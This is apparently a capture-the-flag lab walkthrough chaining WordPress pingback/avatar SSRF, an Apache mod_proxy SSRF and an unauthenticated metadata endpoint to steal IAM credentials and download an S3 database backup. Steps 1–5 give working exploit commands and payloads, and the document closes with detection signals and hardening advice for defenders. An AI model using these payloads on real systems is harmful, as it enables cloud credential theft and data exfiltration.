# Chain 4 — SSRF to AWS IMDS to S3 Backup Dump

**Flag**: `FLAG{wpvulnlab-chain4-d8e5f2a3}`
**Difficulty**: Advanced
**Vulns chained**:
1. WordPress pingback / avatar SSRF — CVE-2022-3590 + CVE-2024-28890
2. Apache `mod_proxy` SSRF — CVE-2021-40438
3. Simulated AWS IMDSv1 endpoint (no token required)
4. Exposed MinIO S3 bucket containing a DB backup (`backups/wp-dump.sql.gz`)

## Story

The lab's `docker-compose.aux.yml` ships a MinIO container exposed as a
fake S3 endpoint and a Python container masquerading as the AWS Instance
Metadata Service on `169.254.169.254`. The attacker abuses a WordPress
SSRF primitive to make the WP container query the metadata endpoint,
steals IAM credentials, then signs S3 requests to download a database
backup containing the flag.

## Pre-requisites

```bash
docker compose -f docker-compose.yml -f docker-compose.aux.yml up -d
bash scripts/plant-flags.sh
export TARGET=http://localhost:31338
```

Aux services expected:
- `imds`     -> internal `169.254.169.254:80` (HTTP)
- `minio`    -> internal `minio:9000`, host `:31390`
- bucket `wp-backups` containing `backups/wp-dump.sql.gz`

Tools: `curl`, `python3`, `awscli` (or `mc`), `gzip`, `grep`.

## Step 1 — Probe SSRF via avatar fetch (CVE-2024-28890)

The avatar processor downloads arbitrary URLs server-side when a comment
provides an `author_url` with a `gravatar?d=` redirect target:

```bash
curl -s -X POST $TARGET/wp-comments-post.php \
  --data-urlencode "comment=ssrf probe" \
  --data-urlencode "author=ssrf" \
  --data-urlencode "email=ssrf@x.tld" \
  --data-urlencode "url=http://169.254.169.254/latest/meta-data/" \
  --data-urlencode "comment_post_ID=1" \
  -o /dev/null -w "%{http_code}\n"
```

Expected: `302` (comment accepted). The avatar fetcher fires on the next
admin moderation view, but a faster primitive is the pingback:

## Step 2 — Pingback SSRF (CVE-2022-3590)

```bash
cat > /tmp/pb.xml <<'EOF'
<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>http://169.254.169.254/latest/meta-data/iam/security-credentials/wp-ssrf-role</string></value></param>
    <param><value><string>http://localhost:31338/?p=1</string></value></param>
  </params>
</methodCall>
EOF
curl -s -H 'Content-Type: text/xml' --data-binary @/tmp/pb.xml \
  $TARGET/xmlrpc.php
```

Expected: an XML response containing `faultString` with the *body* of the
IMDS reply embedded in the error message (classic blind-but-leaky pingback
SSRF).

## Step 3 — Confirm IMDS leak via Apache mod_proxy (CVE-2021-40438)

If the pingback response is truncated, use the mod_proxy primitive:

```bash
curl -s "$TARGET/icons/?inhonesto=:unix:/path|http://169.254.169.254/latest/meta-data/iam/security-credentials/wp-ssrf-role"
```

Expected JSON:

```json
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "FAKE.SESSION.TOKEN",
  "Expiration": "2026-12-31T23:59:59Z"
}
```

(These are the fake creds baked into the `imds` aux container.)

## Step 4 — Enumerate S3 with stolen creds

```bash
export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
export AWS_SESSION_TOKEN=FAKE.SESSION.TOKEN
export AWS_DEFAULT_REGION=us-east-1
export S3=http://localhost:31390

aws --endpoint-url $S3 s3 ls
aws --endpoint-url $S3 s3 ls s3://wp-backups/backups/
```

Expected:

```
2026-05-22 10:00:00         wp-backups
2026-05-22 10:00:01     12345 wp-dump.sql.gz
```

## Step 5 — Download and grep the dump for the flag

```bash
aws --endpoint-url $S3 s3 cp s3://wp-backups/backups/wp-dump.sql.gz /tmp/wp-dump.sql.gz
gunzip -c /tmp/wp-dump.sql.gz | grep -oE 'FLAG\{[^}]+\}'
```

Expected:

```
FLAG{wpvulnlab-chain4-d8e5f2a3}
```

## Final flag

`FLAG{wpvulnlab-chain4-d8e5f2a3}` is embedded in
`s3://wp-backups/backups/wp-dump.sql.gz` (inserted into the
`wp_postmeta` table by `plant-flags.sh`).

## Detection

| Step | Signal |
|------|--------|
| 1    | Comments posted with `url=http://169.254.*` or RFC1918 targets |
| 2    | POST `/xmlrpc.php` with `pingback.ping` after years of dormancy |
| 3    | Apache requests with `inhonesto=:unix:` or `|http://` in query string (CVE-2021-40438 marker) |
| 4    | Outbound S3 list/get from a workstation IP using an EC2 instance-profile key |
| 5    | Large GET (DB dump size) from S3 |

VPC Flow Logs would show the WP container talking to `169.254.169.254`,
which is unusual unless the workload genuinely uses IAM roles for service
accounts.

## Hardening

- Block all outbound traffic from the WP container to RFC1918 and link-local
  ranges, including `169.254.169.254`, at the Docker network / VPC layer.
- Enforce IMDSv2 (token-required); IMDSv1 has been deprecated for years.
- Patch Apache to >= 2.4.49 (CVE-2021-40438).
- Disable `xmlrpc.php` (`Deny from all` or remove the file) and
  `pingback.ping` (`add_filter('xmlrpc_methods', function($m){
  unset($m['pingback.ping']); return $m; });`).
- Restrict S3 bucket policies; never grant `s3:ListBucket` /
  `s3:GetObject` to the instance role for the entire backup bucket.
- Encrypt backups at rest with a KMS key the WP role cannot use.
